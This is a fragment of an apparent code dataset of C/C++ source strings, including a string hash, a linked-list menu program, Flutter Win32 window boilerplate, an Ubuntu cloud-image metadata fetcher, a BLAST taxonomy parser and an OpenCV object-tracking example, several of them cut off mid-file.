size_t p = 31;\n    size_t m = 1e9 + 9;\n    size_t hash_value = 0;\n    size_t p_pow = 1;\n    for (char c : s)\n    {\n        hash_value = (hash_value + (c - 'a' + 1) * p_pow) % m;\n        p_pow = (p_pow * p) % m;\n    }\n    return hash_value;\n}\n\nint main()\n{\n    string password = \"egg\";\n    string matrixString = isomorphMatrix(password);\n    size_t hashValue = calcHash(matrixString);\n    cout << hashValue;\n    return 0;\n}",
    "#include \"iostream\"\r\n#include \"stdio.h\"\r\n#include \"string\"\r\n#include \"windows.h\"\r\nusing namespace std;\r\n\r\n\r\n void gotoxy(int x,int y)\r\n\r\n{  \r\n      HANDLE hcon;  \r\n      hcon = GetStdHandle(STD_OUTPUT_HANDLE);  \r\n      COORD dwPos;  \r\n      dwPos.X = x;  \r\n      dwPos.Y= y;  \r\n      SetConsoleCursorPosition(hcon,dwPos);  \r\n }  \r\n\r\nint main()\r\n{\r\nstring edades[5][2];\r\n    cout << \"Por favor ingrese la siguiente informacion: \\n\";\r\n    string edad,nombre;\r\n    \r\n    for (int i=0; i<5; i++)\r\n    {\r\n        cout << \"\\n******* Resultados \" << i + 1 << \"********:\\n\";\r\n        cout << \"Edad: \";\r\n        getline(cin,edad);\r\n        cout << \"Nombre: \";\r\n        getline(cin,nombre);\r\n        edades[i][0] = edad;\r\n        edades[i][1] = nombre;\r\n    }\r\n    \r\n   system(\"cls\");\r\n    int filas = (sizeof(edades)/sizeof(edades[0]));\r\n    int columnas = (sizeof(edades[0])/sizeof(edades[0][0]));\r\n    \r\n    cout<<\"\\n                   Los datos ingresados son: \\n\";\r\n    gotoxy (25,3);\r\n    cout<<\"Edades\";\r\n    gotoxy (45,3);\r\n    cout<<\"Nombres\";\r\n    for (int i = 0; i < filas; i++)\r\n    {\r\n        for (int j = 0; j < columnas; j++)\r\n        {\r\n        \t gotoxy (25,i+5);\r\n            cout<<edades[i][0];\r\n            gotoxy (45,i+5);\r\n            cout<<edades[i][1];\r\n        }\r\n    }\r\nreturn 0;\r\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include<iostream>\r\nusing namespace std;\r\n\r\nstruct node{\r\n    int data;\r\n    struct node *next;\r\n};\r\nstruct node *head=NULL;\r\nstruct node *tail=NULL;\r\n\r\nvoid insert_begin(){\r\n    int val;\r\n    struct node *ptr;\r\n    ptr=new struct node;\r\n    if(ptr==NULL){\r\n        cout<<\"overflow\"<<endl;\r\n    }\r\n    else{\r\n        cout<<\"enter data : \";\r\n        cin>>val;\r\n        ptr->data=val;\r\n        if(head==NULL){\r\n            head=ptr;\r\n            tail=ptr;\r\n            tail->next=NULL;\r\n        }\r\n        else{\r\n            ptr->next=head;\r\n            head=ptr;\r\n            ptr->data;\r\n        }\r\n    }\r\n}\r\nvoid insert_end(){\r\n    int val;\r\n    struct node *ptr;\r\n    ptr=new struct node;\r\n    if(ptr==NULL){\r\n        cout<<\"overflow\"<<endl;\r\n    }\r\n    else{\r\n        cout<<\"enter data : \";\r\n        cin>>val;\r\n        ptr->data=val;\r\n        if(head==NULL){\r\n            head=ptr;\r\n            tail=ptr;\r\n            tail->next=NULL;\r\n        }\r\n        else{\r\n            tail->next=ptr;\r\n            tail=ptr;\r\n            tail->next=NULL;\r\n        }\r\n    }\r\n}\r\n\r\nvoid insert_middle(){\r\n    int val,pos;\r\n    struct node *ptr;\r\n    ptr=new struct node;\r\n    if(ptr==NULL){\r\n        cout<<\"overflow\"<<endl;\r\n    }\r\n    else{\r\n        cout<<\"enter data : \";\r\n        cin>>val;\r\n        cout<<\"enter the position : \";\r\n        cin>>pos;\r\n        ptr->data=val;\r\n        struct node *temp=head;\r\n        for(int i=1;i<pos-1;i++){\r\n            temp=temp->next;\r\n        }\r\n        ptr->next=temp->next;\r\n        temp->next=ptr;\r\n    }\r\n}\r\n\r\n\r\nvoid delete_begin(){\r\n    int val;\r\n    struct node *ptr=new struct node;\r\n    if(head==NULL){\r\n        cout<<\"cant delete\"<<endl;\r\n    }\r\n    else{\r\n        if(head==tail){\r\n            ptr=head;\r\n            val=ptr->data;\r\n\r\n            head=NULL;\r\n            tail=NULL;\r\n            free(ptr);\r\n            cout<<val<<\" is deleted\"<<endl;\r\n        }\r\n        else{\r\n            ptr=head;\r\n            val=ptr->data;\r\n            head=head->next;\r\n            free(ptr);\r\n            cout<<val<<\" is deleted \"<<endl;\r\n        }\r\n    }\r\n    \r\n}\r\n\r\nvoid delete_end(){\r\n    int val;\r\n    struct node *ptr=new struct node;\r\n    if(head==NULL){\r\n        cout<<\"cant delete\"<<endl;\r\n    }\r\n    else{\r\n        if(head==tail){\r\n            ptr=head;\r\n            val=ptr->data;\r\n\r\n            head=NULL;\r\n            tail=NULL;\r\n            free(ptr);\r\n            cout<<val<<\" is deleted\"<<endl;\r\n        }\r\n        else{\r\n            struct node *temp;\r\n            temp=head;\r\n            while(temp->next!=tail){\r\n                temp=temp->next;\r\n            }\r\n            ptr=tail;\r\n            tail=temp;\r\n            val=ptr->data;\r\n            free(ptr);\r\n            cout<<val<<\" is deleted\"<<endl;\r\n        }\r\n    }\r\n}\r\n\r\n\r\nvoid delete_middle(){\r\n    int val,pos;\r\n    struct node *ptr=new struct node;\r\n    if(head==NULL){\r\n        cout<<\"cant delete\"<<endl;\r\n    }\r\n    else{\r\n        cout<<\"enter the position of element to delete \"<<endl;\r\n        cin>>pos;\r\n        struct node *temp;\r\n        temp=head;\r\n        for(int i=1;i<pos-1;i++){\r\n            temp=temp->next;\r\n        }\r\n        if(temp!=NULL){\r\n            ptr=temp->next;\r\n            temp->next=ptr->next;\r\n            val=ptr->data;\r\n            free(ptr);\r\n            cout<<val<<\" is deleted\"<<endl;\r\n                \r\n    }\r\n    else{\r\n            cout<<\"cant delete\"<<endl;\r\n        }\r\n    }\r\n    }\r\n\r\n\r\nvoid display(){\r\n    struct node *temp;\r\n    temp=head;\r\n    while(temp!=NULL){\r\n        cout<<temp->data<<\"-->\";\r\n        temp=temp->next;\r\n    }\r\n}\r\n\r\nvoid search(){\r\n    struct node *temp;\r\n    int key,flag=1,count=1;\r\n    cout<<\"enter one key to search in array : \";\r\n    cin>>key;\r\n    temp=head;\r\n    while(temp!=NULL){\r\n        if(key==temp->data){\r\n            flag=0;\r\n            break;\r\n        }\r\n        count++;\r\n        temp=temp->next;\r\n    }\r\n    if(flag==0){\r\n        cout<<key<<\" is present at position \"<<count<<endl;\r\n    }\r\n    else{\r\n        cout<<key<<\" is not present\"<<endl;\r\n    }\r\n}\r\nint  main(){\r\n    int choice;\r\n    cout<<\"1. press 1 for insert begin\"<<endl;\r\n    cout<<\"2. press 2 for insert end\"<<endl;\r\n        cout<<\"3. press 3 for insert middle\"<<endl;\r\n        cout<<\"4. press 4 for delete begin\"<<endl;\r\n        cout<<\"5. press 5 for delete end\"<<endl;\r\n        cout<<\"6. press 6 for delete middle\"<<endl;\r\n        cout<<\"7. press 7 for display\"<<endl;\r\n        cout<<\"8. press 8 for searching\"<<endl;\r\n        cout<<\"9. press 9 for exit\"<<endl;\r\n        cout<<\"enter your choice :- \";\r\n        cin>>choice;\r\n        do{\r\n            switch(choice){\r\n                case 1:\r\n                    insert_begin();\r\n                    break;\r\n                case 2:\r\n                    insert_end();\r\n                    break;\r\n                case 3:\r\n                    insert_middle();\r\n                    break;\r\n                case 4:\r\n                    delete_begin();\r\n                    break;\r\n                case 5:",
    "#include \"ubuntu_image_info.h\"\n\n#include <curl/curl.h>\n#include <sstream>\n#include <stdexcept>\n\n#include \"../external/json/json.hpp\"\n\n//Derived class implementation of UbuntuImageInfo\nclass UbuntuImageInfoImpl : public UbuntuImageInfo {\npublic:\n    UbuntuImageInfoImpl() {\n        std::string url = \"https://cloud-images.ubuntu.com/releases/streams/v1/com.ubuntu.cloud:released:download.json\";\n        jsonData = nlohmann::json::parse(UbuntuImageInfoImpl::downloadJson(url));\n    }\n\n    // Implementation of pure virtual methods\n    std::vector<std::string> getSupportedReleases() override {\n        std::vector<std::string> releases{};\n\n        try {\n            //Get all the products\n            const auto &products = jsonData[\"products\"];\n\n            for (const auto &product: products.items()) {\n                const std::string &release = product.key();\n                // Check if the release name ends with \"amd64\"\n                if (release.size() >= 5 && release.substr(release.size() - 5) == \"amd64\") {\n\n                    //Check if the releases supported value is true\n                    if (products[product.key()][\"supported\"].get<bool>()) {\n                        releases.push_back(release);\n                    }\n\n                }\n            }\n\n        } catch (const std::exception &e) {\n            throw std::runtime_error(\"Failed to parse JSON data: \" + std::string(e.what()));\n\n        }\n\n        return releases;\n    }\n\n    std::string getCurrentLTSVersion() override {\n        std::vector<std::string> releases = getSupportedReleases();\n\n        // Iterate backwards over the releases vector\n        for (auto it = releases.rbegin(); it != releases.rend(); ++it) {\n            const auto &release = *it;\n\n            std::istringstream iss(release);\n            std::string token;\n\n            // Skip the first two tokens (com.ubuntu.cloud:server)\n            std::getline(iss, token, ':');\n            std::getline(iss, token, ':');\n\n            // Get the version number token\n            std::getline(iss, token, ':');\n\n            // Check if the version number ends with \".04\"\n            if (token.size() >= 3 && token.substr(token.size() - 3) == \".04\") {\n                return token;\n            }\n        }\n\n        // No LTS version found\n        return \"\";\n\n    }\n\n    std::string getSHA256(const std::string &release) override {\n        try {\n            const auto &products = jsonData[\"products\"];\n\n            std::string releaseKey;\n\n            if (release == \"latest\") {\n                //Set the release key to the latest release ending in \"amd64\"\n                if (!products.empty()) {\n                    for (auto it = products.rbegin(); it != products.rend(); ++it) {\n                        const std::string &key = it.key();\n                        if (key.find(\":amd64\") != std::string::npos) {\n                            releaseKey = key;\n                            break;\n                        }\n                    }\n                    if (releaseKey.empty()) {\n                        throw std::runtime_error(\"No releases ending in 'amd64' found in the JSON data\");\n                    }\n                }\n            } else {\n                //Construct the release key from the version number\n                //in the format \"com.ubuntu.cloud:server:version:amd64\"\n                releaseKey = \"com.ubuntu.cloud:server:\" + release + \":amd64\";\n            }\n\n            if (products.contains(releaseKey)) {\n                const auto &versions = products[releaseKey][\"versions\"];\n\n                if (!versions.empty()) {\n                    const auto &lastVersion = versions.back();\n                    const auto &items = lastVersion[\"items\"];\n                    if (items.contains(\"disk1.img\")) {\n                        return items[\"disk1.img\"][\"sha256\"].get<std::string>();\n                    }\n                }\n\n            }\n\n\n        }\n        catch (const std::exception &e) {\n            throw std::runtime_error(\"Failed to retrieve SHA256: \" + std::string(e.what()));\n        }\n\n        //No SHA found for release\n        return \"\";\n\n    }\n\nprivate:\n    static std::string downloadJson(const std::string &url) {\n        CURL *curl = curl_easy_init();\n\n        if (!curl) {\n            throw std::runtime_error(\"Failed to initialize libcurl\");\n        }\n\n        std::stringstream buffer; // Buffer to store the downloaded JSON data\n        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);\n        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buffer);\n\n        CURLcode result = curl_easy_perform(curl);\n\n        if (result != CURLE_OK) {\n            throw std::runtime_error(\"Failed to download JSON data: \" +\n                                     std::string(curl_easy_strerror(result)));\n        }\n\n        curl_easy_cleanup(curl);\n\n        return buffer.str();\n\n    }\n\n    static size_t writeCallback(char *ptr, size_t size, size_t nmemb,",
    "#include <unistd.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <stdint.h>\r\n#include <iostream>\r\n#include <fstream>\r\n#include <unordered_map>\r\n#include <string>\r\n#include <vector>\r\n#include <stdexcept>\r\n#include <map>\r\n#include <set>\r\n#include <algorithm>\r\n#include <string>\r\n#include <list>\r\n#include <utility>\r\n#include <stdexcept>\r\n#include <deque>\r\n#include <regex>\r\n#include <iostream>\r\n#include <mutex>\r\n#include <thread>\r\ntemplate<typename K, typename V>\r\nvoid print_map(std::unordered_map<K, V> const &m)\r\n{\r\n    for (auto const &pair: m) {\r\n        std::cout << \"{\" << pair.first << \": \" << pair.second << \"}\\n\";\r\n    }\r\n}\r\n\r\nstd::mutex mtx;\r\n\r\n#include \"util.hpp\"\r\n\r\nvoid usage(char *progname);\r\nstd::vector<std::string> extractHitAccessions(const std::string& filename);\r\nvoid parseXML(const std::string& filename, const std::string& outputFilename);\r\nstd::string get_common_name(const std::string& taxonomy_id);\r\nvoid createDictionary(std::unordered_map<std::string, std::string>& taxid2name_dictionary, std::string names_filename);\r\nstd::string get_common_name(const std::unordered_map<std::string, std::string>& taxid2name_dictionary, const std::string& key);\r\nstd::vector<std::string> extractHitAccessionsMultiBLAST(const std::string& filename);\r\nvoid parse_dmnd_output(const std::string& filename, std::vector<std::vector<std::string>>& result);\r\nvoid parse_prot_acc2taxid_multithread(int threadNum, const std::string& filename, std::unordered_map<std::string, std::string>& dictionary, std::mutex& mergeMutex);\r\nstd::string processFileforBLASTdbcmd(const std::vector<std::string>& accession_nos, const std::string& sequence, const std::string& db_path, const std::string& outputFilename);\r\nstd::string executeCommand(const std::string& command);\r\nstd::vector<std::string> splitString(const std::string& str, char delimiter);\r\n\r\nint main(int argc, char** argv) {\r\n\r\n    std::unordered_map<Accession, TaxonId> acc2taxid;\r\n\t//std::cout << \"Allocating memory...\" << std::endl;\r\n\t//acc2taxid.reserve(4932678007);\r\n    TaxTree nodes;\r\n    std::unordered_map<TaxonId, TaxonName> node2name;\r\n\t//std::unordered_map<Accession, TaxonId> prot_acc2taxid_dict;\r\n\r\n\tstd::string nodes_filename = \"\";\r\n\tstd::string names_filename = \"\";\r\n\tstd::string acc2taxid_filename = \"\";\r\n\tstd::string in1_filename = \"\";\r\n\tstd::string out_filename;\r\n\r\n\t//These are only required if using BLAST command line tool\r\n\tstd::string filename = \"\";\r\n    std::string outputFilename = \"parsed_blast_output.tsv\";\r\n\r\n\tstd::unordered_map<std::string, std::string> taxid2name_dictionary;\r\n\t//std::unordered_map<std::string, std::string> prot_acc2taxid_dict;\r\n\t\r\n\t\r\n\tbool full_path = false;\r\n\tbool specified_ranks = false;\r\n    bool verbose = false;\r\n\tstd::string multiblast = \"false\";\r\n\tstd::string ranks_arg;\r\n\tstd::string sequence;\r\n\tstd::string db_path;\r\n\r\n\t// Variables related to multithreaded parse_prot_acc2tax_multithread function, not required if not generating dictionary\r\n\tstd::vector<std::thread> threads;\r\n    const int numThreads = 98;\r\n    const std::string directoryPath = \"processed/\";\r\n\r\n    std::unordered_map<std::string, std::string> mergedDictionary;\r\n    std::mutex mergeMutex; // Mutex for thread-safe access to mergedDictionary\r\n\r\n\t//use the parseXML function to write a tsv file with the blast data\r\n\t//parseXML(filename, outputFilename);\r\n\r\n\t// Read command line params\r\n\tint c;\r\n\twhile ((c = getopt(argc, argv, \"hva:f:s:i:o:r:pd:\")) != -1) {\r\n\t\tswitch (c) {\r\n\t\t\tcase 'h':\r\n\t\t\t\tusage(argv[0]);\r\n\t\t\t\tbreak;\r\n\t\t\tcase 'v':\r\n\t\t\t\tverbose = true;\r\n\t\t\t\tbreak;\r\n\t\t\t//case 'a':\r\n\t\t\t//\tacc2taxid_filename = optarg;\r\n\t\t\t//\tbreak;\r\n\t\t\tcase 'd':\r\n\t\t\t\tdb_path = optarg;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 'p':\r\n\t\t\t\tfull_path = true;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 'o':\r\n\t\t\t\tout_filename = optarg;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 'f':\r\n\t\t\t\tmultiblast = optarg;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 's':\r\n\t\t\t\tsequence = optarg;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 'i':\r\n\t\t\t\tin1_filename = optarg;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 'r': {\r\n\t\t\t\tspecified_ranks = true;\r\n\t\t\t\tranks_arg = optarg;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\tdefault:\r\n\t\t\t\tusage(argv[0]);\r\n\t\t}\r\n\t}\r\n\r\n\tnodes_filename = db_path + \"/FASTA/nodes.dmp\";\r\n\tnames_filename = db_path + \"/FASTA/names.dmp\";\r\n\t//Extract accession numbers from BLAST xml or multiBLAST table\r\n\tstd::cout << \"Generating taxid2commonname dictionary from...\" << names_filename << std::endl;\r\n\r\n\tcreateDictionary(taxid2name_dictionary, names_filename);\r\n\tstd::vector<std::string> accession_nos;\r\n\tif (multiblast == \"true\") {\r\n\t\tstd::cout << \"MultiBLAST table selected as input: \" << in1_filename << std::endl;\r\n\t\taccession_nos = extractHitAccessionsMultiBLAST(in1_filename);\r\n\t} else if (multiblast == \"false\"){\r\n\t\tstd::cout << \"BLAST .xml file selected as input: \" << in1_filename << std::endl;\r\n\t\taccession_nos = extractHitAccessions(in1_filename);\r\n\t} else if (multiblast == \"diamond\") {\r\n\t\tstd::cout << \"Diamond output selected as input: \" << in1_filename << std::endl;\r\n\t\t\r\n\t}\r\n\t// Print the extracted accession numbers\r\n    //for (const auto& accession : acces",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "// CSRT object tracking example (C) 2021 Stephane Charette <stephanecharette@gmail.com>\n// MIT license applies.  See \"license.txt\" for details.\n\n\n#include <opencv2/opencv.hpp>\n#include <opencv2/tracking/tracking.hpp>\n\n\ntypedef cv::Ptr<cv::Tracker> Tracker;\t///< single object tracker (could be any OpenCV tracker, not just CSRT)\n\nstruct ObjectTracker\n{\n\tbool\t\tis_valid;\t///< used to detremine if this tracker should be used or skipped\n\tstd::string\tname;\t\t///< name we give to the tracker for debug purposes\n\tcv::Scalar\tcolour;\t\t///< colour we'll use to draw the output onto the mat\n\tcv::Rect2d\trect;\t\t///< last reported rectangle for this tracker\n\tsize_t\t\tlast_valid;\t///< last frame index where this tracker reported positive results\n\tTracker\t\ttracker;\t///< CSRT tracker\n\n\t/// Create an object Tracker from a rectangle and an image.\n\tObjectTracker(const std::string n, const cv::Scalar c, const cv::Rect2d r, cv::Mat & mat) :\n\t\tis_valid(true),\n\t\tname(n),\n\t\tcolour(c),\n\t\trect(r),\n\t\tlast_valid(0)\n\t{\n\t\ttracker = cv::TrackerCSRT::create();\n\t\ttracker->init(mat, rect);\n\t\treturn;\n\t}\n\n\t/// Create an object Tracker from 4 normalized X,Y,W,H values instead of a cv::Rect2d.\n\tObjectTracker(const std::string n, const cv::Scalar c, const double x, const double y, const double w, const double h, cv::Mat & mat) :\n\t\tObjectTracker(n, c, cv::Rect2d(x * mat.cols, y * mat.rows, w * mat.cols, h * mat.rows), mat)\n\t{\n\t\treturn;\n\t}\n};\n\n\ntypedef std::vector<ObjectTracker> VObjectTrackers;\n\n\n/** These next few variables would be in a structure or class that gets passed around.\n * For this example code I kept it simple and left them as globals.\n * @{\n */\nstd::chrono::high_resolution_clock::duration frame_duration;\ncv::VideoCapture cap;\ncv::Size desired_size(1024, 768);\nbool enable_object_tracking\t\t\t\t= true;\nstd::string window_title\t\t\t\t= \"CSRT Example\";\nsize_t fps_rounded\t\t\t\t\t\t= 0;\nsize_t total_frames\t\t\t\t\t\t= 0;\n/// @}\n\n/// All trackers used while the video is being processed (people, ball, etc).\nVObjectTrackers all_trackers;\n\n\n/// Remember that OpenCV uses BGR, not RGB. @{\nconst cv::Scalar red\t(0.0\t, 0.0\t, 255.0\t);\nconst cv::Scalar blue\t(255.0\t, 0.0\t, 0.0\t);\nconst cv::Scalar green\t(0.0\t, 255.0\t, 0.0\t);\nconst cv::Scalar purple\t(128.0\t, 0.0\t, 128.0\t);\nconst cv::Scalar black\t(0.0\t, 0.0\t, 0.0\t);\nconst cv::Scalar white\t(255.0\t, 255.0\t, 255.0\t);\n/// @}\n\n\n/// Open the video, get the timing information we need, and display a few statistics.\nvoid initialize_video(const std::string & filename)\n{\n\tcap.open(filename);\n\tif (cap.isOpened() == false)\n\t{\n\t\tthrow std::invalid_argument(\"failed to open \" + filename);\n\t}\n\n\tconst int width\t\t\t\t\t= cap.get(cv::VideoCaptureProperties::CAP_PROP_FRAME_WIDTH\t);\n\tconst int height\t\t\t\t= cap.get(cv::VideoCaptureProperties::CAP_PROP_FRAME_HEIGHT\t);\n\tconst size_t number_of_frames\t= cap.get(cv::VideoCaptureProperties::CAP_PROP_FRAME_COUNT\t);\n\tconst double fps\t\t\t\t= cap.get(cv::VideoCaptureProperties::CAP_PROP_FPS\t\t\t);\n\tconst double fpm\t\t\t\t= fps * 60.0;\n\tconst double minutes\t\t\t= std::floor(number_of_frames / fpm);\n\tconst double seconds\t\t\t= (number_of_frames - (minutes * fpm)) / fps;\n\n\tfps_rounded = std::round(fps);\n\ttotal_frames = number_of_frames;\n\n\t/* 1 second = 1000 milliseconds\n\t * 1 second = 1000000 microseconds\n\t * 1 second = 1000000000 nanoseconds\n\t */\n\n\tconst size_t length_of_each_frame_in_nanoseconds = std::round(1000000000.0 / fps);\n\tframe_duration = std::chrono::nanoseconds(length_of_each_frame_in_nanoseconds);\n\n\tstd::cout\t<< filename << \":\" << std::endl\n\t\t\t\t<< \"-> \" << width << \" x \" << height << \" @ \" << fps << \" FPS for \"\n\t\t\t\t<< minutes << \"m\" << std::fixed << std::setprecision(1) << seconds << \"s\"\n\t\t\t\t<< \" (\" << number_of_frames << \" total frames)\" << std::endl\n\t\t\t\t<< \"-> each frame is \" << length_of_each_frame_in_nanoseconds << \" nanoseconds\"\n\t\t\t\t<< \" (\" << (length_of_each_frame_in_nanoseconds / 1000000.0) << \" milliseconds)\" << std::endl;\n\n\t// figure out how much we need to zoom each frame (if they're too big to display on my screen)\n\tdouble factor = 1.0;\n\tif (width > desired_size.width or height > desired_size.height)\n\t{\n\t\t// we're going to have to resize each frame since they're larger than what we want to see\n\t\tconst double horizontal_factor\t= static_cast<double>(desired_size.width)\t/ static_cast<double>(width);\n\t\tconst double vertical_factor\t= static_cast<double>(desired_size.height)\t/ static_cast<double>(height);\n\t\tfactor\t\t\t\t\t\t\t= std::max(horizontal_factor, vertical_factor);\n\t\tdesired_size = cv::Size(std::round(factor * width), std::round(factor * height));\n\n\t\tstd::cout\n\t\t\t<< \"-> each frame will be resized to \" << desired_size.width << \" x \" << desired_size.height\n\t\t\t<< \" (zoom factor of \" << factor << \")\"\n\t\t\t<< std::endl;\n\n\t}\n\telse\n\t{\n\t\t// make the desired size match the frame dimensions so we don't resize anything\n\t\tdesired_size = cv::Size(width, height);\n\t}\n\twindow_title = window_title + \" (\" + std::to_string(width) + \" x \" + std::to_string(height) + \" @ \" + std::to_string(static_cast<int>(std::round(100.0 * fac",
